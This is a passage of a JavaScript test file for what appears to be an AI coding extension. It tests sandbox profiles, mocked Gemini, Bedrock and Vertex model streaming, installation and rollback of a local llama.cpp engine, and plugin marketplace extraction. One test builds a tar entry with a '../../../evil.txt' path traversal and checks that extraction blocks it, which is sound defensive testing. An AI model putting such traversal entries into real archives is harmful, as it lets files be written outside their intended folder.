		}
	} finally {
		fs.rmSync(dir, { recursive: true, force: true });
	}
});

// ------------------------------------------------------------------ sandbox helpers

test('sandbox: Seatbelt profile, bwrap args, denial detection', () => {
	const sb = require(OUT + '/tools/sandbox.js');
	const open = sb.seatbeltProfile(true);
	const closed = sb.seatbeltProfile(false);
	assert.match(closed, /\(deny default\)/);
	assert.match(closed, /\(allow file-write\* \(subpath \(param "WRITABLE_ROOT"\)\)/);
	assert.ok(!closed.includes('network-outbound') && open.includes('(allow network-outbound)'));
	const args = sb.bwrapArgs('/work', '/bin/sh', 'make', false);
	assert.deepStrictEqual(args.slice(0, 4), ['--ro-bind', '/', '/', '--dev']);
	assert.ok(args.includes('--unshare-net') && !sb.bwrapArgs('/work', '/bin/sh', 'make', true).includes('--unshare-net'));
	assert.deepStrictEqual(args.slice(-4), ['--', '/bin/sh', '-c', 'make']);
	for (const s of ['touch: /etc/x: Operation not permitted', 'Access to the path \'C:\\x\' is denied.', 'EROFS: read-only file system']) assert.ok(sb.SANDBOX_DENIED.test(s), s);
	assert.ok(!sb.SANDBOX_DENIED.test('3 tests passed'));
});

// ------------------------------------------------------------------ scheduler + autocomplete





// ------------------------------------------------------------------ native providers

test('Gemini native: thinking, text, function calls with thought signatures, usage, schema cleanup', async () => {
	const { streamChat } = require(OUT + '/chatClient.js');
	const seen = [];
	const server = await listen(async (req, res) => {
		seen.push({ url: req.url, key: req.headers['x-goog-api-key'], body: JSON.parse(await body(req)) });
		res.writeHead(200, { 'Content-Type': 'text/event-stream', Connection: 'close' });
		const chunk = (o) => res.write('data: ' + JSON.stringify(o) + '\n\n');
		chunk({ candidates: [{ content: { role: 'model', parts: [{ text: 'Let me look.', thought: true }] } }] });
		chunk({ candidates: [{ content: { role: 'model', parts: [{ text: 'Reading it.' }] } }] });
		chunk({ candidates: [{ content: { role: 'model', parts: [{ functionCall: { name: 'read_file', args: { path: 'a.ts' } }, thoughtSignature: 'SIG123' }] }, finishReason: 'STOP' }], usageMetadata: { promptTokenCount: 1200, candidatesTokenCount: 30, thoughtsTokenCount: 12, cachedContentTokenCount: 1000 } });
		res.end();
	});
	const base = 'http://127.0.0.1:' + server.address().port + '/v1beta';
	try {
		const r = await streamChat({ baseUrl: base, apiKey: 'gk', model: 'gemini-2.5-pro', apiFormat: 'gemini', system: 'sys', messages: [{ role: 'user', content: 'hi' }], signal: new AbortController().signal, tools: [{ name: 'read_file', description: 'Read', parameters: { type: 'object', properties: { path: { type: ['string', 'null'] }, mode: { type: 'string', enum: ['a', 'b'] } }, required: ['path'], additionalProperties: false, $schema: 'x' } }] });
		assert.strictEqual(seen[0].url, '/v1beta/models/gemini-2.5-pro:streamGenerateContent?alt=sse');
		assert.strictEqual(seen[0].key, 'gk');
		assert.deepStrictEqual(seen[0].body.systemInstruction, { parts: [{ text: 'sys' }] });
		const decl = seen[0].body.tools[0].functionDeclarations[0].parameters;
		assert.ok(!('additionalProperties' in decl) && !('$schema' in decl), 'schema cleaned for Gemini');
		assert.deepStrictEqual(decl.properties.path, { type: 'string', nullable: true });
		assert.strictEqual(r.reasoning, 'Let me look.');
		assert.strictEqual(r.text, 'Reading it.');
		assert.deepStrictEqual({ name: r.toolCalls[0].name, args: JSON.parse(r.toolCalls[0].arguments), sig: r.toolCalls[0].signature }, { name: 'read_file', args: { path: 'a.ts' }, sig: 'SIG123' });
		assert.deepStrictEqual({ input: r.usage.input, output: r.usage.output, cached: r.usage.cached }, { input: 1200, output: 42, cached: 1000 });
		// Next turn: the call goes back with its signature, the result as functionResponse.
		await streamChat({ baseUrl: base, apiKey: 'gk', model: 'gemini-2.5-pro', apiFormat: 'gemini', system: '', signal: new AbortController().signal, messages: [{ role: 'user', content: 'hi' }, { role: 'assistant', content: 'Reading it.', toolCalls: r.toolCalls }, { role: 'tool', toolCallId: r.toolCalls[0].id, name: 'read_file', content: 'file text' }] });
		const contents = seen[1].body.contents;
		assert.deepStrictEqual(contents.map((c) => c.role), ['user', 'model', 'user']);
		assert.strictEqual(contents[1].parts[1].thoughtSignature, 'SIG123');
		assert.deepStrictEqual(contents[2].parts[0].functionResponse, { name: 'read_file', response: { content: 'file text' } });
	} finally {
		await close(server);
	}
});

test('AWS Bedrock: Claude over the binary event-stream with a Bedrock API key', async () => {
	const { streamChat } = require(OUT + '/chatClient.js');
	const { decodeEventStream } = require(OUT + '/nativeProviders.js');
	// Encode AWS event-stream frames (CRCs are not checked by the decoder).
	const frame = (headers, payload) => {
		const hs = Buffer.concat(Object.entries(headers).map(([k, v]) => { const name = Buffer.from(k); const val = Buffer.from(v); const len = Buffer.alloc(2); len.writeUInt16BE(val.length); return Buffer.concat([Buffer.from([name.length]), name, Buffer.from([7]), len, val]); }));
		const p = Buffer.from(payload);
		const total = 12 + hs.length + p.length + 4;
		const pre = Buffer.alloc(12);
		pre.writeUInt32BE(total, 0);
		pre.writeUInt32BE(hs.length, 4);
		return Buffer.concat([pre, hs, p, Buffer.alloc(4)]);
	};
	const ev = (o) => frame({ ':message-type': 'event', ':event-type': 'chunk' }, JSON.stringify({ bytes: Buffer.from(JSON.stringify(o)).toString('base64') }));
	const stream = Buffer.concat([
		ev({ type: 'message_start', message: { usage: { input_tokens: 10, cache_read_input_tokens: 90, output_tokens: 1 } } }),
		ev({ type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } }),
		ev({ type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text: 'Hello from Bedrock' } }),
		ev({ type: 'message_delta', delta: { stop_reason: 'end_turn' }, usage: { output_tokens: 5 } })
	]);
	// Split frames across chunks to exercise buffering.
	assert.strictEqual(decodeEventStream(stream.subarray(0, 20)).messages.length, 0);
	let seen;
	const server = await listen(async (req, res) => {
		seen = { url: req.url, auth: req.headers.authorization, body: JSON.parse(await body(req)) };
		res.writeHead(200, { 'Content-Type': 'application/vnd.amazon.eventstream', Connection: 'close' });
		res.write(stream.subarray(0, 37));
		setTimeout(() => res.end(stream.subarray(37)), 20);
	});
	try {
		const r = await streamChat({ baseUrl: 'http://127.0.0.1:' + server.address().port, apiKey: 'bedrock-key', model: 'us.anthropic.claude-sonnet-4-5-20250929-v1:0', apiFormat: 'bedrock', system: 's', messages: [{ role: 'user', content: 'hi' }], signal: new AbortController().signal });
		assert.strictEqual(seen.url, '/model/' + encodeURIComponent('us.anthropic.claude-sonnet-4-5-20250929-v1:0') + '/invoke-with-response-stream');
		assert.strictEqual(seen.auth, 'Bearer bedrock-key');
		assert.strictEqual(seen.body.anthropic_version, 'bedrock-2023-05-31');
		assert.ok(!('model' in seen.body) && !('stream' in seen.body));
		assert.strictEqual(r.text, 'Hello from Bedrock');
		assert.deepStrictEqual({ input: r.usage.input, output: r.usage.output, cached: r.usage.cached }, { input: 100, output: 5, cached: 90 });
		assert.strictEqual(r.stopReason, 'end_turn');
	} finally {
		await close(server);
	}
});

test('Vertex AI: Claude via streamRawPredict and Gemini via streamGenerateContent (access token)', async () => {
	const { streamChat } = require(OUT + '/chatClient.js');
	const seen = [];
	const server = await listen(async (req, res) => {
		seen.push({ url: req.url, auth: req.headers.authorization, body: JSON.parse(await body(req)) });
		res.writeHead(200, { 'Content-Type': 'text/event-stream', Connection: 'close' });
		if (req.url.includes('anthropic')) {
			res.write('data: ' + JSON.stringify({ type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text: 'claude on vertex' } }) + '\n\n');
		} else {
			res.write('data: ' + JSON.stringify({ candidates: [{ content: { parts: [{ text: 'gemini on vertex' }] } }] }) + '\n\n');
		}
		res.end();
	});
	const base = 'http://127.0.0.1:' + server.address().port + '/v1/projects/my-proj/locations/us-east5';
	try {
		const opts = { baseUrl: base, apiKey: 'ya29.token', apiFormat: 'vertex', system: 's', messages: [{ role: 'user', content: 'hi' }], signal: new AbortController().signal };
		assert.strictEqual((await streamChat({ ...opts, model: 'claude-sonnet-4-5@20250929' })).text, 'claude on vertex');
		assert.strictEqual(seen[0].url, '/v1/projects/my-proj/locations/us-east5/publishers/anthropic/models/claude-sonnet-4-5%4020250929:streamRawPredict');
		assert.strictEqual(seen[0].auth, 'Bearer ya29.token');
		assert.strictEqual(seen[0].body.anthropic_version, 'vertex-2023-10-16');
		assert.strictEqual((await streamChat({ ...opts, model: 'gemini-2.5-flash' })).text, 'gemini on vertex');
		assert.match(seen[1].url, /publishers\/google\/models\/gemini-2\.5-flash:streamGenerateContent\?alt=sse$/);
		await assert.rejects(streamChat({ ...opts, baseUrl: 'https://example.com/v1', model: 'gemini-2.5-flash' }), /must end with \/projects/);
	} finally {
		await close(server);
	}
});

// ------------------------------------------------------------------ zer0ne Engine (Hugging Face + llama.cpp)

test('zer0ne Engine: Hugging Face search + files, resumable download, release asset, GGUF scan, server args', async () => {
	const blob = Buffer.alloc(300_000, 7);
	const server = await listen(async (req, res) => {
		const u = new URL(req.url, 'http://x');
		if (u.pathname === '/api/models') {
			assert.strictEqual(u.searchParams.get('filter'), 'gguf');
			assert.ok(u.searchParams.getAll('expand[]').includes('gguf'));
			return json(res, 200, [{ id: 'acme/Tiny-Coder-GGUF', downloads: 1234, likes: 5, lastModified: '2026-09-01T00:00:00Z', pipeline_tag: 'text-generation', tags: ['gguf', 'license:mit'], gguf: { total: 1.5e9, context_length: 32768, architecture: 'qwen2', chat_template: '{% if tools %}...{% endif %}' } }]);
		}
		if (u.pathname === '/api/models/acme/Tiny-Coder-GGUF/tree/main') {
			return json(res, 200, [
				{ type: 'file', path: 'README.md', size: 10 },
				{ type: 'file', path: 'tiny-coder-Q4_K_M.gguf', size: 134, lfs: { size: 300000 } },
				{ type: 'directory', path: 'big' },
				{ type: 'file', path: 'mmproj-tiny-F16.gguf', size: 50 }
			]);
		}
		if (u.pathname === '/api/models/acme/Tiny-Coder-GGUF/tree/main/big') {
			return json(res, 200, [{ type: 'file', path: 'big/tiny-coder-F16-00001-of-00002.gguf', size: 1, lfs: { size: 2e9 } }, { type: 'file', path: 'big/tiny-coder-F16-00002-of-00002.gguf', size: 1, lfs: { size: 1e9 } }]);
		}
		if (u.pathname === '/acme/Tiny-Coder-GGUF/resolve/main/tiny-coder-Q4_K_M.gguf') {
			const range = /bytes=(\d+)-/.exec(req.headers.range || '');
			const start = range ? Number(range[1]) : 0;
			if (!range) {
				// Slow first transfer so the client can pause it halfway.
				res.writeHead(200, { 'Content-Length': blob.length, Connection: 'close' });
				let at = 0;
				const tick = () => {
					if (res.destroyed || at >= blob.length) return res.end();
					res.write(blob.subarray(at, (at += 30_000)));
					setTimeout(tick, 40);
				};
				return tick();
			}
			res.writeHead(range ? 206 : 200, { 'Content-Length': blob.length - start, Connection: 'close' });
			return res.end(blob.subarray(start));
		}
		res.writeHead(404, { Connection: 'close' });
		res.end();
	});
	process.env.HF_ENDPOINT = 'http://127.0.0.1:' + server.address().port;
	delete require.cache[require.resolve(OUT + '/localEngine.js')];
	const E = require(OUT + '/localEngine.js');
	try {
		const [m] = await E.searchHf('tiny', 'downloads');
		assert.deepStrictEqual({ id: m.id, author: m.author, params: m.params, context: m.context, tools: m.tools, tags: m.tags }, { id: 'acme/Tiny-Coder-GGUF', author: 'acme', params: 1.5e9, context: 32768, tools: true, tags: ['gguf'] });
		const files = await E.hfFiles('acme/Tiny-Coder-GGUF');
		assert.deepStrictEqual(files.map((f) => [f.name, f.quant, f.sizeBytes, f.parts.length, !!f.mmproj]), [
			['tiny-coder-Q4_K_M.gguf', 'Q4_K_M', 300000, 1, false],
			['tiny-coder-F16.gguf', 'F16', 3e9, 2, false],
			['mmproj-tiny-F16.gguf', 'F16', 50, 1, true]
		], 'split files grouped, projector last');
		// Download: pause halfway (abort), then resume with a Range request.
		const dest = path.join(tmp, 'models', 'acme', 'tiny-coder-Q4_K_M.gguf');
		const url = E.hfFileUrl('acme/Tiny-Coder-GGUF', 'tiny-coder-Q4_K_M.gguf');
		const pause = new AbortController();
		let pauseQueued = false;
		// A user pause arrives on a later event-loop turn, not inside Undici's progress callback.
		await assert.rejects(E.download(url, dest, (p) => {
			if (p.received >= 120_000 && !pauseQueued) {
				pauseQueued = true;
				setImmediate(() => pause.abort());
			}
		}, pause.signal, blob.length));
		assert.ok(fs.existsSync(dest + '.part') && fs.statSync(dest + '.part').size >= 100_000, 'partial kept');
		const seen = [];
		await E.download(url, dest, (p) => seen.push(p.received), new AbortController().signal, blob.length);
		assert.ok(fs.existsSync(dest) && !fs.existsSync(dest + '.part'));
		assert.ok(Buffer.compare(fs.readFileSync(dest), blob) === 0, 'resumed file is byte-identical');
		// Local scan finds it with a chat id.
		const found = E.scanGguf(path.join(tmp, 'models')).find((g) => g.source === 'zer0ne');
		assert.deepStrictEqual({ id: found.id, quant: found.quant, size: found.sizeBytes }, { id: 'tiny-coder-Q4_K_M', quant: 'Q4_K_M', size: 300000 });
		// Release assets.
		const names = ['llama-b9-bin-win-vulkan-x64.zip', 'llama-b9-bin-win-cpu-x64.zip', 'llama-b9-bin-win-cuda-12.4-x64.zip', 'cudart-llama-bin-win-cuda-12.4-x64.zip', 'llama-b9-bin-macos-arm64.tar.gz', 'llama-b9-bin-ubuntu-vulkan-x64.tar.gz', 'llama-b9-bin-ubuntu-x64.tar.gz'];
		assert.strictEqual(E.pickAsset(names, 'vulkan', 'win32', 'x64'), 'llama-b9-bin-win-vulkan-x64.zip');
		assert.strictEqual(E.pickAsset(names, 'cuda', 'win32', 'x64'), 'llama-b9-bin-win-cuda-12.4-x64.zip');
		assert.strictEqual(E.pickAsset(names, 'metal', 'darwin', 'arm64'), 'llama-b9-bin-macos-arm64.tar.gz');
		assert.strictEqual(E.pickAsset(names, 'cpu', 'linux', 'x64'), 'llama-b9-bin-ubuntu-x64.tar.gz');
		// Server arguments: auto leaves context and GPU layers to llama.cpp's --fit; the retry ladder shrinks.
		const srv = new E.EngineServer(() => undefined);
		const o = { context: 0, gpu: 'auto', lightKv: false, port: 8181, fitMarginMiB: 2048, cacheRamMiB: 4096 };
		const a0 = srv.args(found, o).join(' ');
		assert.ok(a0.includes('--jinja') && a0.includes('--fit on') && a0.includes('--fit-target 2048') && a0.includes('--fit-ctx 8192') && a0.includes('--alias tiny-coder-Q4_K_M') && a0.includes('-np 1'));
		assert.ok(!/ -c | -ngl | -ctk /.test(a0), 'auto sets neither context, layers nor KV type: ' + a0);
		const a1 = srv.args(found, o, 1).join(' ');
		assert.ok(a1.includes('--fit-ctx 4096') && a1.includes('-ctk q8_0 -ctv q8_0') && !a1.includes('-ngl'));
		assert.ok(srv.args(found, o, 2).join(' ').includes('-ngl 0'), 'last rung runs on the CPU');
		const fixed = srv.args(found, { ...o, context: 32768 }, 1);
		assert.deepStrictEqual(fixed.slice(fixed.indexOf('-c'), fixed.indexOf('-c') + 2), ['-c', '16384'], 'a fixed context halves on retry');
		assert.ok(srv.args(found, { ...o, gpu: 'cpu' }).join(' ').includes('-ngl 0'));
		assert.strictEqual(E.autoBackend(true), process.platform === 'darwin' ? 'metal' : process.platform === 'win32' && process.arch === 'arm64' ? 'cpu' : 'cuda');
	} finally {
		delete process.env.HF_ENDPOINT;
		await close(server);
	}
});

test('zer0ne Engine is dependable: tested build pinned, a build that does not start is refused, two builds kept, rollback', async () => {
	const { spawnSync } = require('child_process');
	const E = require(OUT + '/localEngine.js');
	const dir = path.join(tmp, 'engine-dep');
	const exe = process.platform === 'win32' ? 'llama-server.exe' : 'llama-server';
	// One archive with a llama-server inside, served under every platform's CPU asset name.
	const src = path.join(tmp, 'engine-src');
	fs.mkdirSync(src, { recursive: true });
	fs.writeFileSync(path.join(src, exe), 'fake');
	const archive = path.join(tmp, 'engine.tar');
	const tar = process.platform === 'win32' ? path.join(process.env.SystemRoot || 'C:\\Windows', 'System32', 'tar.exe') : 'tar';
	assert.strictEqual(spawnSync(tar, ['-cf', archive, '-C', src, exe]).status, 0, 'test archive built');
	const blob = fs.readFileSync(archive);
	const digest = 'sha256:' + createHash('sha256').update(blob).digest('hex');
	const names = ['win-cpu-x64.zip', 'win-cpu-arm64.zip', 'ubuntu-x64.tar.gz', 'ubuntu-arm64.tar.gz', 'macos-x64.tar.gz', 'macos-arm64.tar.gz'];
	let latest = 'b99999';
	let pinned = true;
	const server = await listen((req, res) => {
		const rel = (tag) => ({ tag_name: tag, assets: names.map((n) => ({ name: 'llama-' + tag + '-bin-' + n, size: blob.length, digest, browser_download_url: base + '/a/' + tag + '/' + n })) });
		if (req.url === '/tags/' + E.ENGINE_PIN) return pinned ? json(res, 200, rel(E.ENGINE_PIN)) : json(res, 404, {});
		if (req.url === '/list') return json(res, 200, [rel(latest)]);
		if (req.url.startsWith('/a/')) {
			res.writeHead(200, { 'Content-Length': blob.length, Connection: 'close' });
			return res.end(blob);
		}
		json(res, 404, {});
	});
	const base = 'http://127.0.0.1:' + server.address().port;
	process.env.ZER0NE_LLAMA_TAG_URL = base + '/tags/{tag}';
	process.env.ZER0NE_LLAMA_RELEASES = base + '/list';
	const ok = () => ({ ok: true, detail: 'version: test' });
	const install = (channel, smoke = ok) => E.installEngine(dir, 'cpu', () => undefined, new AbortController().signal, { channel, smoke });
	try {
		// Default for users: the tested build, whatever is newest.
		const first = await install('tested');
		assert.strictEqual(first.version, E.ENGINE_PIN);
		assert.ok(!first.previous && !first.note && fs.existsSync(first.server));
		// Latest channel: the newest release; the tested build is kept for rollback.
		const second = await install('latest');
		assert.strictEqual(second.version, 'b99999');
		assert.strictEqual(second.previous.version, E.ENGINE_PIN);
		// A build that does not start never replaces a working engine, and its folder is removed.
		latest = 'b99998';
		await assert.rejects(install('latest', () => ({ ok: false, detail: 'error while loading shared libraries: libvulkan.so.1' })), /does not start on this machine: The Vulkan runtime is missing[\s\S]*b99999 \(cpu\) stays installed/);
		assert.strictEqual(E.installedEngine(dir).version, 'b99999');
		assert.ok(!fs.existsSync(path.join(dir, 'b99998-cpu')), 'refused build deleted');
		// Only two builds stay on disk: the new one and the one before it.
		latest = 'b99997';
		const third = await install('latest');
		assert.deepStrictEqual([third.version, third.previous.version], ['b99997', 'b99999']);
		assert.deepStrictEqual(fs.readdirSync(dir).filter((n) => /^b\d+-/.test(n)).sort(), ['b99997-cpu', 'b99999-cpu']);
		// Until a model loaded, the build is unproven; a load marks it.
		assert.ok(!E.installedEngine(dir).proven);
		E.markEngineProven(dir, third.server);
		assert.strictEqual(E.installedEngine(dir).proven, true);
		// Rollback swaps the two builds, and can be undone the same way.
		const back = E.rollbackEngine(dir);
		assert.deepStrictEqual([back.version, back.previous.version, back.proven], ['b99999', 'b99997', true]);
		assert.strictEqual(E.installedEngine(dir).version, 'b99999');
		assert.strictEqual(E.rollbackEngine(dir).version, 'b99997');
		// The tested build unavailable (no such release, or no build for this system): the newest, with a note.
		pinned = false;
		latest = 'b99996';
		const fallback = await install('tested');
		assert.strictEqual(fallback.version, 'b99996');
		assert.match(fallback.note, /tested build/);
		// A kept build whose folder is gone is not offered for rollback.
		fs.rmSync(path.dirname(fallback.previous.server), { recursive: true, force: true });
		assert.strictEqual(E.installedEngine(dir).previous, undefined);
		assert.strictEqual(E.rollbackEngine(dir), undefined);
		// The real start check: a program that runs passes, a file that is not one fails.
		assert.strictEqual(E.smokeTest(process.execPath).ok, true);
		const junk = path.join(tmp, 'not-a-server' + (process.platform === 'win32' ? '.exe' : ''));
		fs.writeFileSync(junk, 'not a program');
		if (process.platform !== 'win32') fs.chmodSync(junk, 0o755);
		assert.strictEqual(E.smokeTest(junk).ok, false);
		// Settings: the channel and helper slot are accepted, nothing else.
		assert.deepStrictEqual(E.sanitizeEngineSettings({ channel: 'latest', helperSlot: false, evil: 1 }), { channel: 'latest', helperSlot: false });
		assert.deepStrictEqual(E.sanitizeEngineSettings({ channel: 'nightly' }), {});
	} finally {
		delete process.env.ZER0NE_LLAMA_TAG_URL;
		delete process.env.ZER0NE_LLAMA_RELEASES;
		await close(server);
	}
});

test('zer0ne Engine crash is recorded: an exit after loading counts, a deliberate stop does not', () => {
	const E = require(OUT + '/localEngine.js');
	let changes = 0;
	const srv = new E.EngineServer(() => changes++);
	// A loaded engine that dies on its own.
	const p1 = { exitCode: 134 };
	Object.assign(srv, { proc: p1, model: 'tiny', run: { model: 'tiny', gpu: 'auto', attempt: 0, loadMs: 1 }, log: 'load ok\nsrv  ggml_abort: GGML_ASSERT(n_tokens <= n_batch) failed\n' });
	srv.exited(p1, 134, null);
	assert.strictEqual(srv.recentCrashes, 1);
	assert.match(srv.lastCrash.detail, /GGML_ASSERT/);
	assert.strictEqual(srv.lastCrash.model, 'tiny');
	assert.ok(!srv.running && changes > 0, 'the page hears about it');
	// A process that dies while still loading is a failed load (ensure reports it), not a crash.
	const p2 = { exitCode: 1 };
	Object.assign(srv, { proc: p2, run: undefined });
	srv.exited(p2, 1, null);
	assert.strictEqual(srv.recentCrashes, 1);
	// Eject / switch: stop() lets go of the process first, so its exit is not a crash.
	const p3 = { exitCode: 0 };
	Object.assign(srv, { proc: p3, run: { model: 'tiny', gpu: 'auto', attempt: 0, loadMs: 1 } });
	srv.stop();
	srv.exited(p3, 0, null);
	assert.strictEqual(srv.recentCrashes, 1);
	// Hung (the process looks alive but does not answer): abandon() counts it and clears it.
	const p4 = { exitCode: 0 };
	Object.assign(srv, { proc: p4, run: { model: 'tiny', gpu: 'auto', attempt: 0, loadMs: 1 }, log: '' });
	srv.abandon();
	assert.strictEqual(srv.recentCrashes, 2);
	assert.ok(!srv.running && !srv.run);
	// Only the last 30 minutes count toward "stop restarting it".
	srv.crashes = [Date.now() - 31 * 60_000, Date.now() - 1000, Date.now()];
	assert.strictEqual(srv.recentCrashes, 2);
});

// ------------------------------------------------------------------ plugin marketplace

test('marketplace: catalogue, source kinds, GitHub tarball extraction (pax paths, traversal blocked), install one plugin', async () => {
	const zlib = require('zlib');
	const header = (name, size, type = '0') => {
		const h = Buffer.alloc(512);
		h.write(name.slice(0, 100), 0);
		h.write('0000644\0', 100);
		h.write(size.toString(8).padStart(11, '0') + '\0', 124);
		h.write(type, 156);
		h.write('ustar\0', 257);
		h.fill(32,148,156);
		h.write(h.reduce((sum,b)=>sum+b,0).toString(8).padStart(6,'0') + '\0 ',148);
		return h;
	};
	const file = (name, body) => {
		const b = Buffer.from(body);
		return Buffer.concat([header(name, b.length), b, Buffer.alloc((512 - (b.length % 512)) % 512)]);
	};
	const pax = (p) => {
		const rec = ' path=' + p + '\n';
		const line = String(rec.length + String(rec.length).length + 1) + rec;
		const b = Buffer.from(line);
		return Buffer.concat([header('pax', b.length, 'x'), b, Buffer.alloc((512 - (b.length % 512)) % 512)]);
	};
	const longPath = 'repo-abc/plugins/deep-tool/' + 'x'.repeat(90) + '/notes.md';
	const tar = Buffer.concat([
		header('pax_global_header', 0, 'g'),
		file('repo-abc/README.md', 'root readme'),
		file('repo-abc/plugins/deep-tool/.claude-plugin/plugin.json', JSON.stringify({ name: 'deep-tool', version: '2.0.0' })),
		file('repo-abc/plugins/deep-tool/commands/go.md', '---\ndescription: Go\n---\nGo!'),
		file('repo-abc/plugins/deep-tool/hooks/hooks.json', '{"hooks":{}}'),
		pax(longPath),
		file('placeholder', 'long path body'),
		file('repo-abc/plugins/deep-tool/../../../evil.txt', 'nope'),
		Buffer.alloc(1024)
	]);
	const { extractTar, resolveSource, fetchMarketplace, fetchPluginFolder, inspectPlugin } = require(OUT + '/tools/marketplace.js');
	const out = path.join(tmp, 'tar-out');
	assert.strictEqual(extractTar(tar, 'plugins/deep-tool', out), 4);
	assert.ok(fs.existsSync(path.join(out, '.claude-plugin', 'plugin.json')) && fs.existsSync(path.join(out, 'x'.repeat(90), 'notes.md')), 'pax long path honoured');
	assert.ok(!fs.existsSync(path.join(out, 'README.md')), 'only the plugin folder');
	assert.ok(!fs.existsSync(path.join(tmp, 'evil.txt')) && !fs.existsSync(path.join(out, '..', 'evil.txt')), 'no path traversal');
	assert.deepStrictEqual(resolveSource({ source: './plugins/x', marketplace: 'o/m' }), { repoUrl: 'https://github.com/o/m.git', github: 'o/m', sub: 'plugins/x', ref: undefined });
	assert.deepStrictEqual(resolveSource({ source: { source: 'git-subdir', url: 'https://github.com/a/b.git', path: 'plugins/y', sha: 'abc' }, marketplace: 'o/m' }), { repoUrl: 'https://github.com/a/b.git', github: 'a/b', sub: 'plugins/y', ref: 'abc' });
	assert.strictEqual(resolveSource({ source: { source: 'url', url: 'https://gitlab.com/a/b.git' }, marketplace: 'o/m' }).github, undefined, 'non-GitHub falls back to git');
	// Catalogue + tarball from mock GitHub hosts, then install through PluginHost.
	const server = await listen((req, res) => {
		if (req.url === '/acme/market/main/.claude-plugin/marketplace.json') return json(res, 200, { name: 'acme', plugins: [{ name: 'deep-tool', description: 'Deep', version: '2.0.0', category: 'dev', author: { name: 'Acme' }, source: './plugins/deep-tool' }, { name: 'broken' }] });
		if (req.url === '/acme/market/tar.gz/HEAD') {
			res.writeHead(200, { 'Content-Type': 'application/gzip', Connection: 'close' });
			return res.end(zlib.gzipSync(tar));
		}
		res.writeHead(404, { Connection: 'close' });
		res.end();
	});
	const base = 'http://127.0.0.1:' + server.address().port;
	process.env.ZER0NE_GITHUB_RAW = base;
	process.env.ZER0NE_GITHUB_CODELOAD = base;
	try {
		const m = await fetchMarketplace('https://github.com/acme/market', true);
		assert.deepStrictEqual(m.plugins.map((p) => [p.name, p.author, p.marketplace]), [['deep-tool', 'Acme', 'acme/market']], 'invalid entries dropped');
		const { dir, cleanup } = await fetchPluginFolder(m.plugins[0]);
		assert.deepStrictEqual(inspectPlugin(dir), { commands: 1, agents: 0, skills: 0, hooks: true, mcp: false, warnings: [] });
		const { PluginHost } = require(OUT + '/tools/plugins.js');
		const host = new PluginHost(path.join(tmp, 'mkt-user'), () => undefined, () => []);
		assert.deepStrictEqual(host.installFromFolder(dir, 'user'), ['deep-tool']);
		cleanup();
		assert.strictEqual(host.plugins()[0].version, '2.0.0');
		assert.ok(!fs.existsSync(dir), 'temp folder cleaned');
	} finally {
		delete process.env.ZER0NE_GITHUB_RAW;
		delete process.env.ZER0NE_GITHUB_CODELOAD;
		await close(server);
	}
});

// ------------------------------------------------------------------ cloud tasks

test('cloud tasks: deep refresh rechecks GitHub while task updates leave setup checks untouched', async () => {
	const { CloudHost, cloudEndpoint } = require(OUT + '/host/cloudHost.js');
	assert.match(cloudEndpoint('responses', 'https://api.openai.com/v1').error, /Responses API/);
	const repo = fs.mkdtempSync(path.join(tmp, 'cloud-status-'));
	const { execFileSync } = require('child_process');
	execFileSync('git', ['init', '-q'], { cwd: repo });
	execFileSync('git', ['remote', 'add', 'origin', 'https://github.com/owner/project.git'], { cwd: repo });
	const previousFolders = fakeVscode.workspace.workspaceFolders;
	fakeVscode.workspace.workspaceFolders = [{ uri: new Uri(repo) }];
	const messages = [], requests = [];
	const host = new CloudHost({}, { get: () => [] }, '', async () => {});
	host.token = async () => ({ token: 'fixture', login: 'owner' });
	host.hasGhCli = async () => false;
	host.chatModel = async () => ({ provider: 'API', model: 'm', format: 'openai', baseUrl: 'https://example.test/v1', local: false });
	host.ghJson = async () => ({ private: false, default_branch: 'main' });
	let workflowStatus = 200;
	host.gh = async (_method, url) => { requests.push(url); return new Response(null, { status: url.includes('/contents/') ? workflowStatus : 200 }); };
	host.refresh = async () => {};
	try {
		await host.status({ post: message => messages.push(message) }, false);
		assert.ok(!Object.hasOwn(messages.at(-1).data, 'secret'), 'Lightweight updates omit deep checks instead of clearing them');
		assert.strictEqual(messages.at(-1).data.workspacePath, repo);
		await host.handle({ post: message => messages.push(message) }, { type: 'cloudRefresh' });
		assert.strictEqual(messages.at(-1).data.secret, true);
		assert.strictEqual(messages.at(-1).data.remoteWorkflow, true);
		assert.ok(requests.some(url => url.includes('/actions/secrets/')));
		workflowStatus = 403;
		await host.status({ post: message => messages.push(message) }, true);
		assert.strictEqual(messages.at(-1).data.remoteWorkflow, null, 'Lack of access is unknown and clears stale confirmation over JSON transport');
	} finally {
		host.dispose();
		fakeVscode.workspace.workspaceFolders = previousFolders;
	}
});

test('cloud tasks: headless runner edits, runs and finishes (OpenAI + Anthropic formats); log parsing; GitHub remotes', async () => {
	const { execFile } = require('child_process');
	const runner = path.join(__dirname, '..', 'media', 'cloud', 'runner.mjs');
	for (const format of ['openai', 'anthropic']) {
		const repo = fs.mkdtempSync(path.join(tmp, 'cloud-' + format + '-'));
		fs.writeFileSync(path.join(repo, 'app.js'), 'const greeting = "helo";\n');
		let turn = 0;
		const seen = [];
		const server = await listen(async (req, res) => {
			const b = JSON.parse(await body(req));
			seen.push({ url: req.url, auth: req.headers.authorization || req.headers['x-api-key'], b });
			turn++;
			const calls =
				turn === 1
					? [{ id: 't1', name: 'read_file', args: { path: 'app.js' } }]
					: turn === 2
						? [{ id: 't2', name: 'edit_file', args: { path: 'app.js', find: '"helo"', replace: '"hello"' } }, { id: 't3', name: 'run_command', args: { command: 'node -e "process.stdout.write(require(\'fs\').readFileSync(\'app.js\',\'utf8\'))"' } }]
						: [{ id: 't4', name: 'finish', args: { summary: 'Fixed the greeting typo.' } }];
			if (format === 'anthropic') json(res, 200, { content: [{ type: 'text', text: 'Working.' }, ...calls.map((c) => ({ type: 'tool_use', id: c.id, name: c.name, input: c.args }))] });
			else json(res, 200, { choices: [{ message: { content: 'Working.', tool_calls: calls.map((c) => ({ id: c.id, type: 'function', function: { name: c.name, arguments: JSON.stringify(c.args) } })) } }] });
		});
		const out = path.join(repo, '.out');
		const log = await new Promise((resolve, reject) =>
			execFile(process.execPath, [runner], {
				cwd: repo,
